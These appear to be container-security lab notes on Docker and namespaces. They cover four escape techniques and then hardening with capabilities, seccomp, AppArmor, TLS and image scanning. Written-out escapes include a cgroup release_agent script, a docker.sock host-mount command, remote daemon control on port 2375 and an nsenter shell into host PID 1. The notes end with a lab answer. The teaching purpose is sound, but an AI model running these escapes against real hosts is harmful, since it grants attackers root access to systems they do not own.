# Containers

![Containers overview](/images/containers-101.png)

## What is containerisation?

Containerisation is the process of packaging an application with the resources it needs to run, such as libraries, packages, runtime files, and configuration. The packaged unit is called a **container**.

Containerisation helps make applications portable because the application and its dependencies travel together. If the destination system supports the containerisation engine, the application should behave consistently across environments.

Modern applications often depend on many frameworks and libraries. Without containers, those dependencies can create operational problems:

- Dependencies may be difficult or impossible to install on some operating systems.
- Developers may struggle to reproduce faults because the problem may come from the environment rather than the application.
- Dependency versions can conflict. For example, two applications may require different Python versions.

Container platforms reduce these issues by packaging dependencies and isolating the application environment. In this context, **isolation** means the application gets a separate operating environment; it does not automatically mean complete security isolation.

![Containerised application environments](/images/containers-102.png)

The screenshot above shows multiple applications and their dependency environments packaged separately. They do not directly interact with the physical computer; instead, they interact through the containerisation engine.

Containers commonly rely on **Linux namespaces**, which allow processes to access operating system resources without directly interacting with unrelated processes. Namespace isolation provides a security benefit because a compromise in one container usually does not affect other containers unless namespaces, privileges, or host resources are shared incorrectly.

Compared with virtual machines, containers are lightweight because they do not require a full guest operating system per application.

## Introducing Docker

Docker is a widely used, open-source containerisation platform. The Docker ecosystem allows applications to be built, deployed, managed, and shared through **images**.

Operationally, Docker is useful because:

- It works across Linux, Windows, and macOS.
- Applications can be published as images and shared with others.
- Users can pull an image and run it with the Docker Engine.
- The Docker Engine acts as an API layer between the host operating system and containers.

The Docker Engine allows containers to access host resources such as CPU, RAM, networking, and disk through controlled interfaces. This makes it possible to:

- Connect containers together, such as a web application container and a database container.
- Export and import application images.
- Transfer files between the host operating system and a container.

Docker commonly uses **YAML** for configuration in orchestration workflows. YAML-based definitions allow developers to describe how containers should be built and run, making deployments easier to reproduce and debug.

![Docker engine and container orchestration](/images/containers-103.png)

Docker can orchestrate multiple containers as part of a group. This allows related services, such as a web server and a database, to communicate as a coordinated application stack.

## Benefits and features of Docker

Docker provides an agile and convenient way to deploy applications. Its main benefits are portability, consistency, efficiency, and ease of sharing.

### Docker is free

The Docker ecosystem is open source and free to use for many purposes. Paid business plans exist, but users can download, create, run, and share images without paying for the core workflow.

### Docker is compatible

Docker is compatible with Linux, macOS, and Windows. If a device supports the Docker Engine, it can run compatible containers regardless of the application dependencies inside the image.

### Docker is efficient and minimal

Docker is generally more resource-efficient than virtual machines because containers share the host kernel and do not each run a full guest operating system. Multiple containers can also share image layers, reducing disk use.

### Docker is easy to start using

Docker has extensive documentation and many public examples. The command syntax is approachable, and many common applications already have published Docker images.

### Docker is easy to share

Docker images act like build instructions plus packaged application content. Images can be exported, shared, uploaded to registries such as Docker Hub or GitHub Container Registry, and run by any compatible Docker Engine.

### Docker is minimal by design

Containers often include only the tools and packages specified by the developer. This minimalism supports:

- More precise container construction.
- Smaller attack surface.
- Better understanding of what is actually running inside the container.

A minimal container can be harder for attackers to use after compromise because tools such as `bash`, `wget`, `curl`, or `netcat` may be missing unless the image includes them.

### Docker is cheaper to run

Containers are often cheaper to run than virtual machines, especially in cloud environments where CPU, memory, and storage are billed resources. A small virtual private server can usually run several containers, while running full virtual machines requires more memory, disk space, and virtualization support.

## How containerisation works

Namespaces segregate system resources such as processes, files, memory, networking, and hostnames. Every Linux process is associated with:

- A namespace.
- A process identifier, or PID.

Namespaces are central to containerisation because processes can normally only see other processes in the same namespace. Each new Docker container typically runs in a separate namespace, even if that container runs multiple processes.

![Container process namespace comparison](/images/containers-104.png)

On Linux systems, PID 1 is the first process started when the system boots. On modern Ubuntu systems, PID 1 is usually `systemd`. Other processes are started under this initial process.

Container escape techniques may attempt to abuse namespace relationships with PID 1 or other host processes. Containers are intended to isolate processes, but misconfiguration can cause a container to share namespaces with the host and create an escape opportunity.

![Namespace process relationship](/images/containers-105.png)

## Container vulnerabilities 101

![Container vulnerabilities overview](/images/containers-106.png)

Container compromise does not automatically mean host compromise. A foothold inside a container normally gives access only to the container environment, not the host operating system, host files, or other containers.

![Container minimal environment](/images/containers-107.png)

Important operational realities:

- Containers are isolated environments by design.
- Containers are often minimal and may lack common tools such as `bash`, `wget`, or `netcat`.
- Attackers may need to rely on installed tooling, uploaded binaries, or application-layer techniques.
- Misconfigurations can weaken or eliminate container isolation.

## Common Docker container vulnerability classes

Docker containers are meant to isolate applications, but they can still contain vulnerabilities. A vulnerable web application inside a container can expose hard-coded credentials, secrets, internal network access, or other sensitive resources.

Example hard-coded database configuration:

```php
/** Database hostname */
define('DB_HOST','localhost');

/** Database name */
define('DB_NAME','sales');

/** Database username */
define('DB_USER','production');

/** Database password */
define('DB_PASSWORD','SuperstrongPassword321!');
```

| Vulnerability | Description |
|---|---|
| Misconfigured containers | Containers may have privileges that are unnecessary for their function. For example, a privileged container can access host resources and weaken isolation. |
| Vulnerable images | Public or popular images may contain vulnerable packages or malicious backdoors, including cryptomining payloads. |
| Network connectivity | Poorly networked containers may expose internal services to the internet. Containers may also become lateral movement paths to other containers on the same host. |

## Vulnerability 1: Privileged containers and capabilities

### Understanding capabilities

Linux capabilities are granular privileges granted to processes or executables by the Linux kernel. They allow specific privileged actions without granting unrestricted root privileges.

Docker containers can run in two broad modes:

- **User/normal mode** - the container interacts with the host through the Docker Engine and receives limited privileges.
- **Privileged mode** - the container receives broad access to host resources and bypasses many normal isolation controls.

![Privileged container mode](/images/containers-108.png)

In user mode, containers interact with the operating system through the Docker Engine. In privileged mode, the container can interact much more directly with the host operating system.

### Operational impact

If a container is running with privileged access, an attacker who compromises that container may be able to execute commands as root on the host.

Use `capsh` to list capabilities assigned to the container:

```bash
capsh --print
```

Example capabilities of interest:

```text
Current: = cap_chown, cap_sys_module, cap_sys_chroot, cap_sys_admin, cap_setgid, cap_setuid
```

Capabilities such as `cap_sys_admin` are especially sensitive because they allow administrative operations such as mounting filesystems.

### Example: cgroup release agent abuse

The following sequence demonstrates the concept of abusing host-accessible cgroups from an over-privileged container. The operational lesson is that privileged containers can allow host filesystem access and command execution paths that should not exist in normal container operation.

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release

host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

echo "$host_path/exploit" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /exploit

echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit

chmod a+x /exploit

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Key points:

- The exploit relies on cgroup behavior and privileged host interaction.
- The `release_agent` can be used to trigger execution when the cgroup releases.
- The payload can be modified to perform different host-level actions, such as reading a host file or creating a reverse shell.
- This is a direct reason to avoid privileged containers unless there is a tightly controlled operational need.

## Vulnerability 2: Escaping via an exposed Docker socket

### Unix sockets

Unix sockets move data between processes using the filesystem rather than a network interface. This is a form of inter-process communication. Unix sockets are commonly faster than TCP/IP sockets and rely on filesystem permissions.

### Docker socket use

Docker commands such as `docker run` communicate with the Docker Engine through a socket. On Linux, this is usually the Unix socket:

```text
/var/run/docker.sock
```

A user generally needs root privileges or membership in the `docker` group to use Docker commands through this socket.

Verify Docker group membership:

```bash
groups
```

Example output:

```text
cmnatic sudo docker
```

### Finding the Docker socket inside a container

If `docker.sock` is mounted inside a container, that container may be able to control the Docker daemon.

```bash
find / -name '*sock' 2>/dev/null
```

Example result:

```text
/var/run/docker.sock
```

The directory path containing the socket is:

```text
/var/run
```

### Exploiting access to docker.sock

A common abuse path is to use Docker from the compromised container to start a new container that mounts the host filesystem.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Command breakdown:

- `docker run` starts a new container.
- `-v /:/mnt` mounts the host root filesystem inside the new container at `/mnt`.
- `--rm` removes the container after it exits.
- `-it` runs the container interactively.
- `alpine` uses a lightweight image.
- `chroot /mnt sh` changes the container root to the mounted host filesystem and starts a shell.

Success indicator:

```bash
ls /
```

Expected host-like output:

```text
bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

## Vulnerability 3: Remote code execution via exposed Docker daemon

### Docker Engine over TCP

Docker can also communicate through TCP sockets. This is sometimes used for remote administration or CI/CD workflows, such as Portainer or Jenkins-driven deployments.

The security problem occurs when the Docker daemon is exposed without strong authentication or encryption. A remotely accessible daemon can let attackers run Docker commands against the host.

### Enumeration

Docker commonly listens on TCP port `2375` when exposed without TLS.

```bash
nmap -sV -p 2375 <target-ip>
```

Example result:

```text
2375/tcp open docker Docker 20.10.20 (API 1.41)
```

Confirm access with `curl`:

```bash
curl http://<target-ip>:2375/version
```

A successful response returns Docker Engine version and platform details.

### Running Docker commands against the remote host

Use the `-H` switch to send Docker commands to the exposed daemon:

```bash
docker -H tcp://<target-ip>:2375 ps
```

Useful remote Docker commands:

| Command | Description |
|---|---|
| `network ls` | Lists Docker networks and can reveal internal application paths or pivot opportunities. |
| `images` | Lists images used by containers. Images can be analyzed or reverse engineered. |
| `exec` | Executes a command inside a running container. |
| `run` | Starts a new container, potentially with malicious mounts or privileges. |

## Vulnerability 4: Abusing namespaces

### What namespaces do

Namespaces isolate system resources such as processes, files, memory, hostnames, and networking. Every Linux process has a namespace and a PID.

A normal container usually has a small process list. For example:

```bash
ps aux
```

Container-like output may show only a handful of processes:

```text
USER       PID  COMMAND
root         1  /sbin/init
root        14  /usr/sbin/apache2 -D FOREGROUND
www-data    15  /usr/sbin/apache2 -D FOREGROUND
www-data    16  /usr/sbin/apache2 -D FOREGROUND
root        81  ps aux
```

A small process list is a useful indicator that you may be inside a container, though it is not conclusive.

### When namespace isolation fails

Some containers share namespaces with the host for debugging, monitoring, or other special use cases. In that situation, `ps aux` may show host processes from inside the container, such as:

```text
/sbin/init
[kthreadd]
/usr/bin/docker-proxy
/usr/bin/containerd-shim-runc-v2
/usr/sbin/sshd -D
```

If the container can see host process namespaces, namespace-entering tools may allow the attacker to execute commands in the host namespace.

### Exploiting shared namespaces with nsenter

`nsenter` can start a process inside the namespace of another process. If the container can target host PID 1, it may be possible to start a host-level shell.

```bash
nsenter --target 1 --mount --uts --ipc --net /bin/bash
```

Command breakdown:

- `--target 1` targets PID 1, usually the host init/systemd process.
- `--mount` enters the target process mount namespace.
- `--uts` enters the target UTS namespace, including hostname context.
- `--ipc` enters the inter-process communication namespace.
- `--net` enters the target network namespace.
- `/bin/bash` starts a shell in the selected namespaces.

Operational takeaway: a container that shares host namespaces can allow host-level access and should be treated as a high-risk configuration.

## Protecting the Docker daemon

The Docker daemon manages containers and images. If an attacker can interact with it, they may be able to launch malicious containers, access existing containers, retrieve secrets, or mount host filesystems.

The Docker daemon is not exposed to the network by default, but it is often exposed in CI/CD or cloud workflows. If remote daemon access is required, it must be protected with strong authentication and encrypted transport.

### Protecting Docker with SSH

Docker contexts allow developers to interact with remote Docker hosts over SSH.

Create a Docker context:

```bash
docker context create \
  --docker host=ssh://myuser@remotehost \
  --description="Development Environment" \
  development-environment-host
```

Switch to that context:

```bash
docker context use development-environment-host
```

Return to the default local context:

```bash
docker context use default
```

Security notes:

- The remote user must have permission to run Docker commands.
- SSH access must be protected with strong authentication.
- Weak SSH passwords can still result in Docker daemon compromise.
- Prefer SSH keys and strong identity controls over password-only SSH.

### Protecting Docker with TLS

Docker can also be accessed over HTTPS using TLS certificates. When configured securely, Docker only accepts remote commands from clients with trusted certificates.

Run Docker daemon with TLS verification:

```bash
dockerd --tlsverify \
  --tlscacert=myca.pem \
  --tlscert=myserver-cert.pem \
  --tlskey=myserver-key.pem \
  -H=0.0.0.0:2376
```

Connect as a TLS-authenticated client:

```bash
docker --tlsverify \
  --tlscacert=myca.pem \
  --tlscert=client-cert.pem \
  --tlskey=client-key.pem \
  -H=<server-ip>:2376 info
```

| Argument | Description |
|---|---|
| `--tlscacert` | Specifies the certificate authority certificate. |
| `--tlscert` | Specifies the certificate used to identify the device. |
| `--tlskey` | Specifies the private key used for encrypted communication and identity. |

TLS is only as secure as the certificate and key management process. Anyone with a trusted certificate and private key may be able to authenticate.

## Implementing control groups

Control groups, or **cgroups**, are Linux kernel features that restrict and prioritize system resource use. They can limit resources such as CPU and memory.

In Docker, cgroups support isolation and stability. They help prevent a faulty or malicious container from exhausting host resources.

| Type of Resource | Argument | Example |
|---|---|---|
| CPU | `--cpus` in core count | `docker run -it --cpus="1" mycontainer` |
| Memory | `--memory` using `k`, `m`, or `g` | `docker run -it --memory="20m" mycontainer` |

Update memory limits for a running container:

```bash
docker update --memory="40m" mycontainer
```

Inspect resource limits:

```bash
docker inspect mycontainer
```

If a resource limit appears as `0`, no limit has been set.

Example fields:

```json
{
  "Memory": 0,
  "CpuQuota": 0,
  "CpuRealtimePeriod": 0,
  "CpuRealtimeRuntime": 0,
  "CpusetCpus": "",
  "CpusetMems": "",
  "CpuCount": 0,
  "CpuPercent": 0
}
```

## Preventing over-privileged containers

Privileged containers have unchecked access to the host. The purpose of containerisation is to isolate containers from the host, so privileged mode should be avoided unless there is a narrow and justified need.

![Privileged container hardening](/images/containers-109.png)

When a container runs in privileged mode, Docker assigns all possible capabilities to it. This means the container may be able to access host filesystems and perform administrative actions.

Capabilities provide granular privileges. Instead of running a container with `--privileged`, assign only the required capability.

| Capability | Description | Use Case |
|---|---|---|
| `CAP_NET_BIND_SERVICE` | Allows services to bind to ports under 1024, which normally requires root. | Allow a web server to bind to port 80 without full root privileges. |
| `CAP_SYS_ADMIN` | Provides broad administrative privileges, including filesystem mount operations and network settings changes. | Administrative automation; high risk if granted unnecessarily. |
| `CAP_SYS_RESOURCE` | Allows a process to modify resource limits. | Control or adjust resource consumption. |

Example: allow a web server to bind to port 80 while dropping all other capabilities:

```bash
docker run -it --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE mywebserver
```

Review assigned capabilities:

```bash
capsh --print
```

Key hardening rule: review container capabilities frequently and avoid sharing host namespaces unless absolutely required.

## Seccomp and AppArmor 101

Seccomp and AppArmor are Linux security mechanisms that can reduce the impact of container compromise.

### Seccomp

Seccomp restricts which system calls a process can make. Think of it as a rule set for kernel-level actions. For example, a Seccomp profile can allow file reads while denying process execution or network socket creation.

Example Seccomp profile concept:

```json
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "architectures": [
    "SCMP_ARCH_X86_64",
    "SCMP_ARCH_X86",
    "SCMP_ARCH_X32"
  ],
  "syscalls": [
    {
      "names": [
        "read", "write", "exit", "exit_group", "open", "close",
        "stat", "fstat", "lstat", "poll", "getdents", "munmap",
        "mprotect", "brk", "arch_prctl", "set_tid_address", "set_robust_list"
      ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "names": ["execve", "execveat"],
      "action": "SCMP_ACT_ERRNO"
    }
  ]
}
```

This type of profile allows many normal operations but blocks execution-related system calls such as `execve`.

Apply a Seccomp profile at runtime:

```bash
docker run --rm -it --security-opt seccomp=/home/cmnatic/container1/seccomp/profile.json mycontainer
```

Docker already applies a default Seccomp profile, but custom profiles may be useful when hardening a specific application while preserving needed functionality.

### AppArmor

AppArmor is a Mandatory Access Control system that limits what resources an application can access and what actions it can take. Unlike Seccomp, which focuses on system calls, AppArmor applies operating-system-level access policies.

Check whether AppArmor is installed and active:

```bash
sudo aa-status
```

Expected indicator:

```text
apparmor module is loaded.
```

A basic AppArmor workflow is:

1. Create an AppArmor profile.
2. Load the profile into AppArmor.
3. Run the container with the profile.

Example AppArmor profile concept for an Apache web server:

```text
/usr/sbin/httpd {
  capability setgid,
  capability setuid,

  /var/www/** r,
  /var/log/apache2/** rw,
  /etc/apache2/mime.types r,
  /run/apache2/apache2.pid rw,
  /run/apache2/*.sock rw,

  network tcp,
  /dev/log w,
  /usr/bin/perl ix,

  /** ix,
  deny /bin/**,
  deny /lib/**,
  deny /usr/**,
  deny /sbin/**
}
```

Import the AppArmor profile:

```bash
sudo apparmor_parser -r -W /home/cmnatic/container1/apparmor/profile.json
```

Run a container with the AppArmor profile:

```bash
docker run --rm -it --security-opt apparmor=/home/cmnatic/container1/apparmor/profile.json mycontainer
```

### Seccomp versus AppArmor

- **AppArmor** determines what resources an application can access, such as filesystem paths, network interfaces, CPU, or memory-related resources.
- **Seccomp** restricts what system calls the process can make.
- They are complementary controls and can be combined for layered container security.

## Reviewing Docker images

Reviewing Docker images is a critical security practice. Unknown images should be treated like unknown code because they may contain vulnerable packages, malicious payloads, exposed secrets, or unsafe build instructions.

In 2020, Palo Alto reported cryptomining Docker images that were pulled over two million times, showing the risk of blindly trusting public images.

Docker Hub often shows the image layers that were created during the build process.

![Docker Hub image layers](/images/containers-110.png)

Each layer represents build steps executed during image creation.

Open-source image repositories may include the Dockerfile, allowing analysts to review exactly what the image does.

![Dockerfile repository review](/images/containers-111.png)

When reviewing a Dockerfile, look for:

- Suspicious downloads.
- Hard-coded credentials or secrets.
- Unexpected network calls.
- Unsafe permissions.
- Unnecessary packages.
- Privileged execution patterns.

Tools such as **Dive** can inspect Docker images layer by layer, showing what changes were made during each build step.

![Dive Docker image inspection](/images/containers-112.png)

## Compliance and benchmarking

Compliance and benchmarking help organizations evaluate whether containers are being secured according to recognized standards and best practices.

**Compliance** means following relevant regulations, standards, and guidance. **Benchmarking** measures whether the implementation matches best-practice expectations.

| Compliance Framework | Description | URL |
|---|---|---|
| NIST SP 800-190 | Provides container security concerns and recommended mitigations. | `https://csrc.nist.gov/publications/detail/sp/800-190/final` |
| ISO 27001 | International standard for establishing, maintaining, and improving an information security management system. | `https://www.iso.org/standard/27001` |

Additional industry-specific frameworks may apply, such as HIPAA in medical environments or other sector-specific regulations.

| Benchmarking Tool | Description | URL |
|---|---|---|
| CIS Docker Benchmark | Assesses Docker configuration against the CIS Docker Benchmark. | `https://www.cisecurity.org/benchmark/docker` |
| OpenSCAP | Assesses compliance with multiple frameworks, including CIS Docker Benchmark and NIST SP 800-190. | `https://www.open-scap.org/` |
| Docker Scout | Docker cloud-based service that scans Docker images and libraries for vulnerabilities and remediation steps. | `https://docs.docker.com/scout/` |
| Anchore | Assesses images and container environments against policy and compliance frameworks. | `https://github.com/anchore/anchore-engine` |
| Grype | Modern vulnerability scanner for Docker images. | `https://github.com/anchore/grype` |

Example Docker Scout scan:

```bash
docker scout cves local://nginx:latest
```

Example output excerpt:

```text
✓ SBOM of image already cached, 215 packages indexed
✗ Detected 22 vulnerable packages with a total of 45 vulnerabilities

## Overview
Target            │ local://nginx:latest
platform          │ linux/amd64
vulnerabilities   │ 0C  1H  18M  28L
size              │ 91 MB
packages          │ 215
```

Use vulnerability scanning and benchmarking as recurring operational practices, not one-time checks.

## Rapid-reference checklist

Use this checklist when reviewing container security posture.

### Discovery and enumeration

- Identify whether the environment uses Docker, containerd, Kubernetes, or another runtime.
- Check whether you are inside a container by reviewing process counts, filesystem markers, hostname, and cgroup data.
- Look for mounted Docker sockets, especially `/var/run/docker.sock`.
- Check for exposed Docker daemon TCP ports, especially `2375` and `2376`.
- Enumerate container capabilities with `capsh --print`.
- Review whether host namespaces are shared.

### High-risk findings

- Containers running with `--privileged`.
- Containers with `CAP_SYS_ADMIN` or other unnecessary high-impact capabilities.
- Mounted host filesystem paths.
- Mounted Docker socket.
- Exposed unauthenticated Docker daemon.
- No resource limits.
- Unreviewed or untrusted public images.
- Missing or overly permissive Seccomp/AppArmor profiles.

### Defensive controls

- Avoid privileged containers.
- Drop all capabilities, then add back only what is required.
- Use Docker contexts over SSH for remote administration where appropriate.
- Use TLS for Docker daemon access when HTTP/S remote access is required.
- Apply cgroup resource limits.
- Use Seccomp and AppArmor together where practical.
- Review and scan images before deployment.
- Use compliance benchmarks such as CIS Docker Benchmark and NIST SP 800-190 guidance.

## Answer prompts preserved from source

### Exposed Docker socket

```text
Name the directory path which contains the docker.sock file on the container.
```

Expected study-note answer from the source context:

```text
/var/run
```

### Container hardening

```text
Answer the questions below
```

The source document included this prompt without listing the specific follow-on questions.
